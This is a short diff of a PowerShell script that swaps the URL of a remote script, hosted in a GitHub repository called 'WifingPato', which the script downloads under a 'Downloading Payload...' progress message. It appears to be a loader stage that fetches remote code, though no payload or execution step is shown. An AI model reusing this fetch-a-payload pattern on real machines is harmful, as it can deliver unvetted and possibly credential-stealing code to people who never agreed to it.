@@ -28,7 +28,7 @@ if (-not $args) {
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
     $URLs = @(
-        'https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/Ang%20Mangagawa/angmangagawa.ps1'
+        'https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/Ang%20Mangagawa/main.ps1'
     )
 
     Write-Progress -Activity "Downloading Payload..." -Status "Connecting to GitHub"
